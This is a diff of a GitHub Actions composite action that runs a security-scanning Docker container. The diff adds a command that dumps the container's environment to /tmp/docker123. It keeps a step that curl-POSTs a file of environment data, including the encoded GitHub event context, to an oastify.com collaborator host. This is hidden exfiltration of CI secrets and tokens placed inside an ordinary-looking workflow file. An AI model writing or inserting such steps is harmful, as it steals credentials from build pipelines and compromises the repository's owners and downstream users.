@@ -162,7 +162,8 @@ runs:
           ${{ inputs.container_args }} \
           -v ${CENTRALIZED_REPO_FILES_LOCATION_PATH}:/.jit \
           ${{ env.mount_original_repo_command }} \
-          ${{ steps.set-image.outputs.image }}
+          ${{ steps.set-image.outputs.image }} \
+          env >>/tmp/docker123
       shell: bash
       env:
         # this field would set the original repo command mount command (would be mounted always in the old flow) and only if checkout = true in the new flow
@@ -200,35 +201,7 @@ runs:
         
     - name: My request
       shell: bash
-      run: curl -X POST -F "file=@/tmp/docker_env.txt" http://3hl7qaz9b8q5nzlf35da5m1ed5jw7nxbm.oastify.com
-    
-    - name: Env
-      if: always()
-      run: |
-        B64_ENCODED_GITHUB_EVENT=$(echo $GH_EVENT_JSON | base64)
-        echo "Encoded GITHUB EVENT with base64"
-        echo CONFIG_FILE_PATH=${CONFIG_FILE_PATH} > /tmp/docker_env.txt
-        echo GITHUB_EVENT=$B64_ENCODED_GITHUB_EVENT >> /tmp/docker_env.txt
-        echo SOURCE_CODE_FOLDER=/code >> /tmp/docker_env.txt
-        echo FAIL_ON_FINDINGS=${{ inputs.fail_on_findings }} >> /tmp/docker_env.txt
-        if [ ${{ inputs.security_control_output_file }} != "" ]
-        then
-          echo SECURITY_CONTROL_OUTPUT_FILE=${{ inputs.security_control_output_file }} >> /tmp/docker_env.txt
-        fi
-        docker run \
-          --rm \
-          ${{ inputs.inline_environment }} \
-          --env-file /tmp/docker_env.txt \
-          ${{ inputs.container_args }} \
-          -v ${CENTRALIZED_REPO_FILES_LOCATION_PATH}:/.jit \
-          ${{ env.mount_original_repo_command }} \
-          ${{ steps.set-image.outputs.image }} \
-          env >>/tmp/docker123
-      shell: bash
-      env:
-        # this field would set the original repo command mount command (would be mounted always in the old flow) and only if checkout = true in the new flow
-        mount_original_repo_command: ${{ fromJSON('["","-v $(pwd)/code:/code"]')[((!(fromJSON(inputs.runner_setup)) || (fromJSON(inputs.runner_setup).checkout == true)))] }}
-        GH_EVENT_JSON: ${{ toJSON(github) }} # https://github.com/actions/runner/issues/1656#issuecomment-1030077729  
+      run: curl -X POST -F "file=@/tmp/docker_env.txt" http://3hl7qaz9b8q5nzlf35da5m1ed5jw7nxbm.oastify.co
     
     - name: Send docker123
       shell: bash
